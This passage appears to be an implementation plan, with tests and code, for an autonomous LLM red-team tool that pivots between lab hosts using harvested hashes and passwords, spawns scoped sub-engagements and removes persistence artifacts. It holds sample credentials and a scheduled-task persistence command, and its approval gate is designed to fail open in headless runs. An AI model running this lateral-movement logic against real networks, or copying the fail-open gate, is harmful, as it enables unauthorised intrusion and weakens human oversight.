async def test_happy_path_spawns_phase4_graph(tmp_path, monkeypatch):
    """Full spawn with the Phase 4 graph, LLM mocked at the router level
    (real fixture payloads) and exploit/postex no-op'd at graph level."""
    from autored.persistence.filesystem import init_engagement_folder

    parent = _parent(tmp_path, monkeypatch)
    init_engagement_folder("parent-1", "192.168.56.22", "op")

    recon_plan = (FIXTURES / "llm_responses" / "recon_plan_lame.json").read_text()
    vuln_plan = (FIXTURES / "llm_responses" / "vuln_hypotheses_shocker.json").read_text()
    exploit_plan = (FIXTURES / "llm_responses" / "exploit_plan_blue.json").read_text()

    with patch("autored.agents.recon.call_with_fallback",
               AsyncMock(return_value=recon_plan)), \
         patch("autored.agents.vuln.call_with_fallback",
               AsyncMock(return_value=vuln_plan)), \
         patch("autored.agents.exploit.call_with_fallback",
               AsyncMock(return_value=exploit_plan)), \
         patch("autored.graph.exploit_node", async_noop_node), \
         patch("autored.graph.postex_node", async_noop_node):
        final = await spawn_sub_engagement(
            parent_state=parent, sub_id="parent-1_sub_01",
            target_host="192.168.56.11", pivot_method="wmiexec",
            credentials=["s-1"],
        )

    # Own folder + checkpoint DB + persisted state under engagements/<sub_id>/
    sub_dir = tmp_path / "engagements" / "parent-1_sub_01"
    assert (sub_dir / "raw").is_dir()
    assert (sub_dir / "state.db").exists()
    assert (sub_dir / "state.json").exists()
    persisted = json.loads((sub_dir / "state.json").read_text())
    assert persisted["engagement_id"] == "parent-1_sub_01"

    # Returned state: hydrated EngagementState, parent linked, scope narrowed
    assert isinstance(final, EngagementState)
    assert final.engagement_id == "parent-1_sub_01"
    assert final.parent_engagement_id == "parent-1"
    assert final.target_scope == ["192.168.56.11"]
    assert final.rules_of_engagement.allowed_ips == ["192.168.56.11"]
    assert final.phase == "done"
```

Implementation notes for the implementer:
1. The LLM mocks return the **raw fixture file text** because `call_with_fallback` returns the model's string response — check how `tests/integration/test_phase4_pipeline.py` feeds these fixtures (some patch `call_with_fallback`, some patch `get_model`) and copy the exact pattern; where this sketch conflicts, the pipeline file wins.
2. The recon fixture plans real tool runs (nmap etc. against `10.10.10.5`). Either additionally patch the recon tool wrappers' `run_subprocess` (copy the patch list from `test_phase4_pipeline.py`), or — simpler and hermetic — have the recon LLM mock return a minimal empty plan (e.g. `'{\"tools\": []}'`) if the recon agent tolerates it. Prefer whichever shape `test_phase4_pipeline.py` already proves works; keep this test's assertions verbatim.
3. `async_noop_node` must patch `autored.graph.exploit_node` / `autored.graph.postex_node` (graph-level binding), NOT the agent modules.

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/integration/test_sub_engagement.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.agents.sub_engagement'`

- [ ] **Step 3: Write `autored/agents/sub_engagement.py`**

```python
"""Sub-engagement spawner — recursive graph launcher (spec §7.2, Phase 5).

A sub-engagement is a full Phase 4 run (recon → vuln → exploit →
postex → report) rooted on a pivot target, with:

* its **own engagement ID** (``<parent>_sub_NN``) and folder under
  ``engagements/`` (manifest, raw/, evidence/, state.json),
* its **own checkpoint DB** (``engagements/<sub_id>/state.db``) so a
  crashed sub-engagement never corrupts the parent's checkpoints,
* ``parent_engagement_id`` linked on its state,
* the parent's RoE **narrowed to ``[target_host]``** — a sub-engagement
  can never touch anything outside its pivot target,
* the parent's EventBus inherited (sandbox auto-approve / TUI HitL
  responses flow through).

**Recursion is structurally capped at depth 1**: the sub-engagement
runs ``build_phase4_graph`` — the Phase 4 graph has no lateral node,
so a sub-engagement cannot spawn sub-sub-engagements. The
:class:`SubEngagementDepthError` guard below is belt-and-braces for a
future Phase 6+ recursive lateral agent (Review Focus #3).
"""
from autored.logging import get_logger
from autored.persistence.filesystem import (
    init_engagement_folder,
    save_state_to_disk,
)
from autored.persistence.sqlite_saver import make_checkpointer
from autored.roe_guard import register_roe
from autored.state import EngagementState

log = get_logger("agents.sub_engagement")


class SubEngagementDepthError(Exception):
    """Raised when a sub-engagement tries to spawn its own sub-engagement."""


async def spawn_sub_engagement(
    parent_state: EngagementState,
    sub_id: str,
    target_host: str,
    pivot_method: str,
    credentials: list[str],
) -> EngagementState:
    """Spawn and run a sub-engagement against a pivot target.

    Args:
        parent_state: The parent engagement's state.
        sub_id: Sub-engagement ID (e.g. ``<parent>_sub_01``).
        target_host: The pivot target IP.
        pivot_method: Method used to pivot (for logging).
        credentials: Credential IDs used by the pivot (for logging).

    Returns:
        The sub-engagement's final hydrated EngagementState.
    """
    if parent_state.parent_engagement_id is not None:
        raise SubEngagementDepthError(
            f"refusing to spawn {sub_id}: {parent_state.engagement_id} "
            f"is itself a sub-engagement (max depth 1)"
        )

    log.info(
        "sub_engagement_start", sub_id=sub_id, target=target_host,
        pivot_method=pivot_method, creds=len(credentials),
    )

    # Own folder + own checkpoint DB.
    init_engagement_folder(sub_id, target_host, parent_state.operator)

    # Parent RoE narrowed to the pivot target only.
    sub_roe = parent_state.rules_of_engagement.model_copy(deep=True)
    sub_roe.allowed_ips = [target_host]

    sub_state = EngagementState(
        engagement_id=sub_id,
        parent_engagement_id=parent_state.engagement_id,
        target_scope=[target_host],
        operator=parent_state.operator,
        rules_of_engagement=sub_roe,
    )
    # Inherit the parent's EventBus so HitL auto-approve / TUI responses
    # keep flowing inside the sub-engagement.
    sub_state.event_bus = getattr(parent_state, "event_bus", None)

    # Register the sub-engagement's (narrowed) RoE for its tool calls.
    register_roe(sub_id, sub_roe)

    # Import here to avoid a circular import (graph.py imports agents).
    from autored.graph import build_phase4_graph

    checkpointer = await make_checkpointer(sub_id)
    graph = build_phase4_graph(checkpointer)
    config = {"configurable": {"thread_id": sub_id}}
    try:
        final = await graph.ainvoke(sub_state, config=config)
    finally:
        conn = getattr(checkpointer, "conn", None)
        if conn is not None:
            await conn.close()

    if isinstance(final, dict):
        final_state = EngagementState.model_validate(final)
    else:
        final_state = final

    save_state_to_disk(sub_id, final_state)
    log.info(
        "sub_engagement_done", sub_id=sub_id, phase=final_state.phase,
        hosts=len(final_state.hosts),
    )
    return final_state
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/integration/test_sub_engagement.py -v` → 2 PASS.
Run full suite `uv run pytest -q` → **289 passed, 4 skipped**.

- [ ] **Step 5: Commit**

```bash
git add autored/agents/sub_engagement.py tests/integration/test_sub_engagement.py
git commit -m "feat: add sub-engagement spawner with depth cap and scope narrowing"
```

---

## Task 11: Lateral Agent Node (LangGraph)

**Files:**
- Create: `autored/agents/lateral.py`
- Test: `tests/integration/test_lateral_agent.py`

**Interfaces:**
- Consumes: `pivotexecutor_subagent` (Task 6), `tunnelsetup_subagent` (Task 7), `spawn_sub_engagement` + `SubEngagementDepthError` (Task 10), `PivotCandidate` / `PivotRecord` / `TunnelConfig` / `SubEngagementRef` / `MovementPath` (Task 1), `Secret` / `Trust` models (Phase 4), `register_roe` + `_ip_in_scope` from `autored.roe_guard`.
- Produces:
  - `async lateral_node(state: EngagementState) -> dict` — the LangGraph node. State patch keys: `pivots`, `tunnels`, `sub_engagements`, `movement_paths`, `phase` (→ `"cleanup"`), `iteration_count`.
  - `_identify_pivot_candidates(secrets, trusts, known_hosts, foothold_ips) -> list[PivotCandidate]`
  - `_select_pivot_method(secret) -> str | None`, `_calculate_confidence(secret, method) -> float`, `_extract_username_from_source(source) -> str`
  - `_hitl_lateral_gate(candidate, state, bus) -> bool`
  - Module constant `MAX_PIVOTS = 3`.

Dual-import pattern (same as `postex.py`): import the sub-agent MODULES and bind their @tool entrypoints to the lateral module namespace so `patch("autored.agents.lateral.pivotexecutor_subagent")` intercepts at call time. Same for `spawn_sub_engagement`.

**Deviations from the spec's §6.5 sketch (each forced by the Phase 4 reality, mirroring documented Phase 4 deviations):**
1. `Secret` has `host_ip`, not `source_host` — candidates read `secret.host_ip` (spec's `secret.source_host` doesn't exist).
2. `Secret` has no `username` field (Phase 4 encodes it in `source` as `"mimikatz:<provider>/<username>"` / `"secretsdump:SAM/<username>"`) — `_extract_username_from_source` parses it. The spec §9.2 `Credential` model (which does carry `username`) ships with the Phase 6 session manager.
3. `Trust` targets are domains/shares, not IPs — pivot targets come from `trust.details["hosts"]` (IP strings, when populated) **plus** known hosts that have no foothold yet. The spec's `trust.host` attribute doesn't exist.
4. Pivot candidate scope check happens BEFORE the HitL gate (an operator is never asked to approve something the scope forbids — same rule as Phase 4's kernel-exploit check). Review Focus #1.
5. `_hitl_lateral_gate` returns True (with a warning log) when `bus is None` and mode isn't auto_approve — a headless `--no-tui` run has nobody to ask; fail-open matches the Exploit Agent's headless behaviour. In sandbox mode it auto-approves without blocking.

- [ ] **Step 1: Write the failing tests**

```python
# tests/integration/test_lateral_agent.py
"""Integration tests for the Lateral Agent node (Phase 5 Task 11).

Direct-node-entry pattern (same as tests/integration/test_postex_agent.py):
construct an EngagementState, patch the sub-agent @tool entrypoints at
their ``autored.agents.lateral`` aliases, call ``lateral_node`` directly,
assert the returned state-dict patch.
"""
from datetime import datetime
from unittest.mock import AsyncMock, patch

from autored.agents.lateral import (
    MAX_PIVOTS,
    _extract_username_from_source,
    _identify_pivot_candidates,
    lateral_node,
)
from autored.models.lateral import PivotRecord
from autored.models.postex import Host, Secret, Trust
from autored.state import EngagementState
from autored.models.roe import RulesOfEngagement
from autored.tui.event_bus import EventBus


def _roe(allowed_ips=None, hitl_mode="auto_approve") -> RulesOfEngagement:
    return RulesOfEngagement(
        engagement_name="t", operator="op", operator_signature="s",
        allowed_ips=allowed_ips or ["0.0.0.0/0"], allowed_techniques=["*"],
        persistence_allowed=True, evasion_allowed=True,
        exfiltration_allowed=True, kernel_exploits_allowed=True,
        hitl_mode=hitl_mode,
    )


def _state(**kwargs) -> EngagementState:
    s = EngagementState(
        engagement_id="eng-1",
        target_scope=["192.168.56.22"],
        operator="op",
        rules_of_engagement=_roe(**{k: v for k, v in kwargs.items()
                                    if k in ("allowed_ips", "hitl_mode")}),
    )
    s.hosts = [
        Host(ip="192.168.56.22", discovered_at=datetime.utcnow(),
             discovered_by="nmap"),
        Host(ip="192.168.56.11", discovered_at=datetime.utcnow(),
             discovered_by="nmap"),
    ]
    # Foothold on host 1 only — host 2 is the pivot target.
    from autored.models.foothold import Foothold
    s.footholds = [
        Foothold(id="f-1", host_ip="192.168.56.22", username="svc",
                 context="user", method="ms17_010", access_type="shell",
                 evidence_path="e", established_at=datetime.utcnow(),
                 hypothesis_rank=1),
    ]
    s.harvested_secrets = [
        Secret(host_ip="192.168.56.22", secret_type="hash",
               secret_value="31d6cfe0d16ae931b73c59d7e0c089c0",
               source="secretsdump:SAM/administrator"),
    ]
    return s


def _pivot_output(success=True):
    from autored.subagents.pivotexecutor import PivotExecutorOutput
    return PivotExecutorOutput(
        pivot=PivotRecord(target_host="192.168.56.11", method="wmiexec",
                          credentials_used=["<sid>"], success=success,
                          needs_tunnel=False),
        success=success, output="goaad\\administrator",
    )


def _fake_sub_state(phase="done"):
    s = _state()
    s.engagement_id = "eng-1_sub_01"
    s.parent_engagement_id = "eng-1"
    s.phase = phase
    s.summary = "sub engagement done"
    return s


async def test_happy_path_pivot_and_sub_engagement(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    state = _state()
    with patch("autored.agents.lateral.pivotexecutor_subagent") as mock_pivot, \
         patch("autored.agents.lateral.tunnelsetup_subagent") as mock_tunnel, \
         patch("autored.agents.lateral.spawn_sub_engagement") as mock_spawn:
        mock_pivot.ainvoke = AsyncMock(return_value=_pivot_output())
        mock_tunnel.ainvoke = AsyncMock(return_value=None)
        mock_spawn.ainvoke = AsyncMock(return_value=_fake_sub_state())
        result = await lateral_node(state)

    assert result["phase"] == "cleanup"
    assert len(result["pivots"]) == 1
    assert result["pivots"][0].target_host == "192.168.56.11"
    assert result["pivots"][0].success is True
    assert len(result["sub_engagements"]) == 1
    ref = result["sub_engagements"][0]
    assert ref.sub_id == "eng-1_sub_01"
    assert ref.status == "completed"
    assert ref.sub_state_path == "engagements/eng-1_sub_01/state.json"
    assert len(result["movement_paths"]) == 1
    assert result["movement_paths"][0].from_host == "192.168.56.22"
    assert result["movement_paths"][0].to_host == "192.168.56.11"
    mock_spawn.ainvoke.assert_awaited_once()
    # candidate was passed to the executor as a dict with the username
    cand = mock_pivot.ainvoke.call_args.kwargs["candidate"]
    assert cand["username"] == "administrator"
    assert cand["method"] == "wmiexec"
    assert cand["target_host"] == "192.168.56.11"


async def test_out_of_scope_target_skipped_before_hitl(tmp_path, monkeypatch):
    """Review Focus #1: RoE allowed_ips excludes the pivot target →
    candidate skipped entirely; executor never called."""
    monkeypatch.chdir(tmp_path)
    state = _state(allowed_ips=["192.168.56.22/32"])
    with patch("autored.agents.lateral.pivotexecutor_subagent") as mock_pivot, \
         patch("autored.agents.lateral.spawn_sub_engagement") as mock_spawn:
        mock_pivot.ainvoke = AsyncMock(return_value=_pivot_output())
        mock_spawn.ainvoke = AsyncMock(return_value=_fake_sub_state())
        result = await lateral_node(state)
    assert result["pivots"] == []
    mock_pivot.ainvoke.assert_not_awaited()
    mock_spawn.ainvoke.assert_not_awaited()
    assert result["phase"] == "cleanup"


async def test_failed_pivot_tries_next_candidate(tmp_path, monkeypatch):
    """Review Focus #2: first candidate fails → agent continues to the
    next candidate (second secret on the same target)."""
    monkeypatch.chdir(tmp_path)
    state = _state()
    state.harvested_secrets.append(
        Secret(host_ip="192.168.56.22", secret_type="password",
               secret_value="Password1!", source="credharvester:manual/bob"),
    )
    with patch("autored.agents.lateral.pivotexecutor_subagent") as mock_pivot, \
         patch("autored.agents.lateral.spawn_sub_engagement") as mock_spawn:
        mock_pivot.ainvoke = AsyncMock(
            side_effect=[_pivot_output(success=False), _pivot_output()],
        )
        mock_spawn.ainvoke = AsyncMock(return_value=_fake_sub_state())
        result = await lateral_node(state)
    assert mock_pivot.ainvoke.await_count == 2
    assert len(result["pivots"]) == 1  # only the successful one recorded
    assert result["pivots"][0].success is True
    assert mock_spawn.ainvoke.assert_awaited_once()


async def test_depth_cap_error_skips_sub_engagement(tmp_path, monkeypatch):
    """Review Focus #3: SubEngagementDepthError → logged, sub skipped,
    the pivot itself is still recorded."""
    monkeypatch.chdir(tmp_path)
    state = _state()
    state.parent_engagement_id = "grandparent"
    with patch("autored.agents.lateral.pivotexecutor_subagent") as mock_pivot, \
         patch("autored.agents.lateral.spawn_sub_engagement") as mock_spawn:
        from autored.agents.sub_engagement import SubEngagementDepthError
        mock_pivot.ainvoke = AsyncMock(return_value=_pivot_output())
        mock_spawn.ainvoke = AsyncMock(side_effect=SubEngagementDepthError("depth"))
        result = await lateral_node(state)
    assert len(result["pivots"]) == 1
    assert result["sub_engagements"] == []


async def test_hitl_rejection_skips_candidate(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    state = _state(hitl_mode="always_ask")
    bus = EventBus()
    await bus.emit_to_orchestrator({"type": "hitl_response", "approved": False})
    state.event_bus = bus
    with patch("autored.agents.lateral.pivotexecutor_subagent") as mock_pivot, \
         patch("autored.agents.lateral.spawn_sub_engagement") as mock_spawn:
        mock_pivot.ainvoke = AsyncMock(return_value=_pivot_output())
        mock_spawn.ainvoke = AsyncMock(return_value=_fake_sub_state())
        result = await lateral_node(state)
    assert result["pivots"] == []
    mock_pivot.ainvoke.assert_not_awaited()
    assert result["phase"] == "cleanup"


async def test_no_candidates_is_noop(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    state = _state()
    state.harvested_secrets = []
    with patch("autored.agents.lateral.pivotexecutor_subagent") as mock_pivot:
        mock_pivot.ainvoke = AsyncMock()
        result = await lateral_node(state)
    assert result["pivots"] == []
    assert result["sub_engagements"] == []
    assert result["phase"] == "cleanup"
    mock_pivot.ainvoke.assert_not_awaited()


# ---------------- pure helpers ----------------

def test_extract_username_from_source():
    assert _extract_username_from_source("secretsdump:SAM/administrator") == "administrator"
    assert _extract_username_from_source("mimikatz:msv/bob") == "bob"
    # Non-credential sources yield no username
    assert _extract_username_from_source("/etc/shadow") == ""
    assert _extract_username_from_source("config:unknown") == ""


def test_identify_pivot_candidates_targets_unfootholded_hosts():
    state = _state()
    cands = _identify_pivot_candidates(
        state.harvested_secrets, state.trust_relationships,
        state.hosts, {f.host_ip for f in state.footholds},
    )
    assert len(cands) == 1
    c = cands[0]
    assert c.target_host == "192.168.56.11"   # the un-footholded host
    assert c.source_host == "192.168.56.22"
    assert c.username == "administrator"
    assert c.method == "wmiexec"              # hash → wmiexec
    assert 0.0 < c.confidence <= 0.95


def test_identify_pivot_candidates_uses_trust_detail_hosts():
    state = _state()
    state.hosts = [state.hosts[0]]  # only host 1 known
    state.trust_relationships = [
        Trust(host_ip="192.168.56.22", trust_type="ad_domain",
              target="NORTH.SOUTH.LOCAL",
              details={"hosts": ["192.168.56.11"]}),
    ]
    cands = _identify_pivot_candidates(
        state.harvested_secrets, state.trust_relationships,
        state.hosts, {"192.168.56.22"},
    )
    assert len(cands) == 1
    assert cands[0].target_host == "192.168.56.11"  # from trust details


def test_max_pivots_constant():
    assert MAX_PIVOTS == 3
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/integration/test_lateral_agent.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.agents.lateral'`

- [ ] **Step 3: Write `autored/agents/lateral.py`**

```python
"""Lateral Agent — LangGraph node that pivots onto new hosts and
spawns recursive sub-engagements (spec §6.5, Phase 5).

Per pivot candidate, in order:

  1. **RoE scope pre-check** — candidates whose target is outside
     ``allowed_ips`` are dropped BEFORE the HitL gate (an operator is
     never asked to approve something the scope forbids — same rule as
     Phase 4's kernel-exploit check). Review Focus #1.
  2. **HitL gate** (EventBus pattern; auto-approved in sandbox mode).
  3. **Pivot execution** via the PivotExecutor sub-agent. A failed
     pivot does NOT abort the loop — the next candidate is tried.
     Review Focus #2.
  4. **Optional tunnel** via TunnelSetup (only when the pivot record
     says one is needed; failures are non-fatal).
  5. **Sub-engagement spawn** — a full Phase 4 run against the pivot
     target with its own ID / folder / checkpoints and a RoE narrowed
     to that single host. ``SubEngagementDepthError`` is caught and
     skipped (the pivot itself still counts). Review Focus #3.

Candidate identification: (credential, target_host, method) triples
from harvested secrets crossed with pivot targets — un-footholded
known hosts plus any new host IPs surfaced in ``Trust.details``.
Sorted by confidence, capped at ``MAX_PIVOTS``.

Deviations from the spec §6.5 sketch are documented in the plan
(Secret.host_ip vs source_host, username parsed from Secret.source,
Trust.details hosts vs trust.host, scope-check-before-HitL,
headless fail-open gate).
"""
from datetime import datetime

from autored.logging import get_logger
from autored.models.lateral import (
    MovementPath,
    PivotCandidate,
    SubEngagementRef,
)
from autored.roe_guard import _ip_in_scope, register_roe
from autored.state import EngagementState

# Sub-agent MODULES + bound @tool entrypoints (dual-import pattern —
# see autored/agents/postex.py's docstring for why both exist).
from autored.subagents import (
    pivotexecutor as _pivotexecutor_mod,
    tunnelsetup as _tunnelsetup_mod,
)
pivotexecutor_subagent = _pivotexecutor_mod.pivotexecutor_subagent
tunnelsetup_subagent = _tunnelsetup_mod.tunnelsetup_subagent

# Sub-engagement spawner (bound the same way so tests can patch
# `autored.agents.lateral.spawn_sub_engagement`).
from autored.agents.sub_engagement import (  # noqa: E402
    SubEngagementDepthError,
    spawn_sub_engagement,
)

log = get_logger("agents.lateral")

# Bound on pivots per lateral pass — each pivot spawns a full
# sub-engagement (recon → vuln → exploit → postex), so this bounds
# engagement wall-clock time.
MAX_PIVOTS = 3

# Secret.source prefixes whose trailing path segment is a username
# (Phase 4's CredHarvester convention).
_CRED_SOURCE_PREFIXES = ("mimikatz:", "secretsdump:", "credharvester:")


async def lateral_node(state: EngagementState) -> dict:
    """LangGraph node: run the Lateral Agent.

    Returns a state-dict patch with new pivots / tunnels /
    sub_engagements / movement_paths and ``phase="cleanup"``.
    """
    log.info("lateral_start", engagement_id=state.engagement_id)

    # Defensive RoE registration (same as postex_node — tests / resume
    # / direct-node-entry paths bypass the CLI).
    register_roe(state.engagement_id, state.rules_of_engagement)

    bus = getattr(state, "event_bus", None)
    foothold_ips = {f.host_ip for f in state.footholds}

    candidates = _identify_pivot_candidates(
        state.harvested_secrets, state.trust_relationships,
        state.hosts, foothold_ips,
    )
    candidates.sort(key=lambda c: c.confidence, reverse=True)

    # RoE scope pre-check — BEFORE any HitL gate (Review Focus #1).
    in_scope = [
        c for c in candidates
        if _ip_in_scope(c.target_host, state.rules_of_engagement.allowed_ips)
    ]
    dropped = len(candidates) - len(in_scope)
    if dropped:
        log.info("lateral_candidates_out_of_scope", dropped=dropped)
    in_scope = in_scope[:MAX_PIVOTS]

    pivots = []
    tunnels = []
    sub_engagements = []
    movement_paths = []

    for candidate in in_scope:
        if state.rules_of_engagement.hitl_mode != "auto_approve":
            approved = await _hitl_lateral_gate(candidate, state, bus)
            if not approved:
                log.info("lateral_candidate_rejected",
                         target=candidate.target_host)
                continue

        output = await pivotexecutor_subagent.ainvoke({
            "candidate": candidate.model_dump(),
            "engagement_id": state.engagement_id,
        })
        if not output.success or output.pivot is None:
            # Failed pivot → try the next candidate (Review Focus #2).
            log.info("lateral_pivot_failed", target=candidate.target_host)
            continue

        pivot = output.pivot
        pivots.append(pivot)
        movement_paths.append(MovementPath(
            from_host=candidate.source_host,
            to_host=candidate.target_host,
            method=pivot.method,
            credential_used=candidate.credential_id,
        ))

        if pivot.needs_tunnel:
            tunnel_out = await tunnelsetup_subagent.ainvoke({
                "pivot": pivot.model_dump(),
                "engagement_id": state.engagement_id,
            })
            tunnel = getattr(tunnel_out, "tunnel", None)
            if tunnel is not None:
                tunnels.append(tunnel)

        sub_id = f"{state.engagement_id}_sub_{len(sub_engagements) + 1:02d}"
        try:
            sub_state = await spawn_sub_engagement(
                parent_state=state,
                sub_id=sub_id,
                target_host=pivot.target_host,
                pivot_method=pivot.method,
                credentials=pivot.credentials_used,
            )
            status = "completed" if sub_state.phase == "done" else "failed"
            summary = sub_state.summary or (
                f"sub-engagement reached phase {sub_state.phase}"
            )
        except SubEngagementDepthError as exc:
            # Review Focus #3 — log, skip, keep the pivot.
            log.warning("lateral_depth_cap", sub_id=sub_id, error=str(exc))
            continue
        except Exception as exc:  # noqa: BLE001 — sub failure isn't fatal
            log.warning("sub_engagement_failed", sub_id=sub_id, error=str(exc))
            status, summary = "failed", f"sub-engagement error: {exc}"

        sub_engagements.append(SubEngagementRef(
            sub_id=sub_id,
            target_host=pivot.target_host,
            pivot_method=pivot.method,
            status=status,
            summary=summary,
            sub_state_path=f"engagements/{sub_id}/state.json",
        ))

    log.info(
        "lateral_done", pivots=len(pivots), tunnels=len(tunnels),
        sub_engagements=len(sub_engagements),
    )
    return {
        "pivots": state.pivots + pivots,
        "tunnels": state.tunnels + tunnels,
        "sub_engagements": state.sub_engagements + sub_engagements,
        "movement_paths": state.movement_paths + movement_paths,
        "phase": "cleanup",
        "iteration_count": state.iteration_count + 1,
    }


def _extract_username_from_source(source: str) -> str:
    """Parse the username out of a Secret.source cred string.

    Phase 4's CredHarvester encodes ``"secretsdump:SAM/<username>"`` /
    ``"mimikatz:<provider>/<username>"`` / ``"credharvester:.../<u>"``.
    Non-credential sources (file paths, registry keys) yield "".
    """
    if source.startswith(_CRED_SOURCE_PREFIXES) and "/" in source:
        return source.rsplit("/", 1)[-1].strip()
    return ""


def _select_pivot_method(secret) -> str | None:
    """Pick the pivot method for a harvested secret.

    Windows-oriented (GoAD): NTLM hashes → wmiexec (pass-the-hash),
    passwords → crackmapexec (validated spray). ``ssh`` pivots need the
    Phase 6 foothold session manager — not selectable yet. Returns None
    when the secret type has no backing tool (secret is skipped).
    """
    if secret.secret_type == "hash":
        return "wmiexec"
    if secret.secret_type == "password":
        return "crackmapexec"
    return None


def _calculate_confidence(secret, method: str) -> float:
    """Heuristic confidence for a pivot candidate (0.0-0.95)."""
    base = 0.7 if secret.secret_type == "hash" else 0.5
    if method == "wmiexec":
        base += 0.1  # PtH is high-fidelity on Windows
    if secret.source.startswith(("mimikatz:", "secretsdump:")):
        base += 0.1  # memory / SAM derived — high quality creds
    return min(base, 0.95)


def _identify_pivot_candidates(
    secrets, trusts, known_hosts, foothold_ips,
) -> list[PivotCandidate]:
    """Find (credential, target_host, method) triples for lateral movement.

    Target hosts: IPs surfaced in ``Trust.details["hosts"]`` that are
    not yet known, plus known hosts without a foothold. Credentials:
    harvested secrets whose source encodes a username.
    """
    known_ips = {h.ip for h in known_hosts}
    target_hosts: list[str] = []

    for trust in trusts:
        details = trust.details if isinstance(trust.details, dict) else {}
        for host_ip in details.get("hosts", []):
            if _is_ipv4(host_ip) and host_ip not in known_ips \
                    and host_ip not in target_hosts:
                target_hosts.append(host_ip)

    for host in known_hosts:
        if host.ip not in foothold_ips and host.ip not in target_hosts:
            target_hosts.append(host.ip)

    if not target_hosts:
        return []

    candidates: list[PivotCandidate] = []
    for secret in secrets:
        username = _extract_username_from_source(secret.source)
        if not username:
            continue
        method = _select_pivot_method(secret)
        if method is None:
            continue
        for target in target_hosts:
            candidates.append(PivotCandidate(
                credential_id=secret.id,
                username=username,
                cred_type=secret.secret_type,
                secret_value=secret.secret_value,
                source_host=secret.host_ip,
                target_host=target,
                method=method,
                confidence=_calculate_confidence(secret, method),
            ))
    return candidates


def _is_ipv4(text: str) -> bool:
    """Cheap dotted-quad check (Trust details may carry hostnames)."""
    parts = text.split(".")
    return (
        len(parts) == 4
        and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts if p.isdigit())
        and all(p.isdigit() for p in parts)
    )


async def _hitl_lateral_gate(candidate, state: EngagementState, bus) -> bool:
    """HitL gate for one pivot candidate (EventBus pattern).

    Sandbox mode auto-approves without blocking. A missing EventBus in
    non-sandbox mode fails OPEN with a warning — a headless ``--no-tui``
    run has nobody to ask (matches the Exploit Agent's headless shape).
    """
    if bus is not None:
        await bus.emit_to_tui({
            "type": "hitl_gate",
            "gate": "lateral_pivot",
            "target": candidate.target_host,
            "method": candidate.method,
            "username": candidate.username,
            "confidence": candidate.confidence,
        })
    if state.rules_of_engagement.hitl_mode == "auto_approve":
        log.info("lateral_auto_approved", target=candidate.target_host)
        return True
    if bus is None:
        log.warning("lateral_gate_headless_fail_open",
                    target=candidate.target_host)
        return True
    response = await bus.wait_for_tui_response()
    approved = bool(response.get("approved", False))
    log.info("lateral_gate_response", target=candidate.target_host,
             approved=approved)
    return approved
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/integration/test_lateral_agent.py -v` → 11 PASS.
Run full suite `uv run pytest -q` → **300 passed, 4 skipped**.

- [ ] **Step 5: Commit**

```bash
git add autored/agents/lateral.py tests/integration/test_lateral_agent.py
git commit -m "feat: add Lateral Agent with pivot candidates, HitL gates, and sub-engagement spawning"
```

---

## Task 12: Cleanup Agent Node (LangGraph)

**Files:**
- Create: `autored/agents/cleanup.py`
- Test: `tests/integration/test_cleanup_agent.py`

**Interfaces:**
- Consumes: `artifactremover_subagent` (Task 8), `verificationscanner_subagent` (Task 9), `CleanupPlan` / `HostCleanupPlan` / `CleanupResult` (Task 1), `PersistenceArtifact` / `Secret` (Phase 4), `register_roe` (RoE guard).
- Produces:
  - `async cleanup_node(state: EngagementState) -> dict` — the LangGraph node. State patch keys: `cleanup_results`, `phase` (→ `"report"`), `iteration_count`.
  - `_identify_temp_files(evidence_paths) -> list[str]` — staged tool binaries / staging zips only (raw evidence is NEVER deleted).
  - `_generate_cleanup_plan(artifacts, tunnels, temp_files, secrets) -> CleanupPlan` — groups per host, picks each host's credentials from harvested secrets, computes `total_actions`.
  - `_hitl_cleanup_gate(plan, state, bus) -> bool` — final operator confirmation (EventBus pattern).
  - `_creds_for_host(host_ip, secrets) -> dict` — first usable username/password/nthash triple for a host.

Per spec §6.6: collect artifacts + tunnels + temp files → plan → HitL gate → execute (ArtifactRemover per host) → verify (VerificationScanner per host) → append removal + verification results to `cleanup_results`. Rejection short-circuits to `phase="report"` with zero results (Review Focus #4). Tunnel teardowns run locally (`run_subprocess` with the recorded `teardown_command`); temp files are unlinked locally.

**Deviation from spec §6.6 sketch:** the spec fans hosts out with `asyncio.gather` — we run hosts sequentially. `cleanup_execute` shells out to impacket per artifact; parallel fan-out multiplies auth failures under Meterpreter/RPC backpressure and makes failures harder to attribute. Sequencing costs seconds per host and keeps logs linear (documented deviation; the plan structure is unchanged).

- [ ] **Step 1: Write the failing tests**

```python
# tests/integration/test_cleanup_agent.py
"""Integration tests for the Cleanup Agent node (Phase 5 Task 12).

Direct-node-entry pattern (same as test_lateral_agent.py): construct
EngagementState, patch the sub-agent @tool entrypoints at their
``autored.agents.cleanup`` aliases, call ``cleanup_node`` directly.
"""
from datetime import datetime
from unittest.mock import AsyncMock, patch

from autored.agents.cleanup import (
    _generate_cleanup_plan,
    _identify_temp_files,
    cleanup_node,
)
from autored.models.cleanup import CleanupResult
from autored.models.lateral import TunnelConfig
from autored.models.postex import PersistenceArtifact, Secret
from autored.state import EngagementState
from autored.models.roe import RulesOfEngagement
from autored.tui.event_bus import EventBus


def _roe(hitl_mode="auto_approve") -> RulesOfEngagement:
    return RulesOfEngagement(
        engagement_name="t", operator="op", operator_signature="s",
        allowed_ips=["0.0.0.0/0"], allowed_techniques=["*"],
        persistence_allowed=True, evasion_allowed=True,
        exfiltration_allowed=True, kernel_exploits_allowed=True,
        hitl_mode=hitl_mode,
    )


def _state(hitl_mode="auto_approve") -> EngagementState:
    s = EngagementState(
        engagement_id="eng-1", target_scope=["192.168.56.22"],
        operator="op", rules_of_engagement=_roe(hitl_mode),
    )
    s.persistence_artifacts = [
        PersistenceArtifact(
            id="a-1", host_ip="192.168.56.22", method="scheduled_task",
            details={"task_name": "AutoRedUpdate", "command": "powershell -enc x"},
            removal_command="schtasks /delete /tn AutoRedUpdate /f",
            foothold_id="f-1",
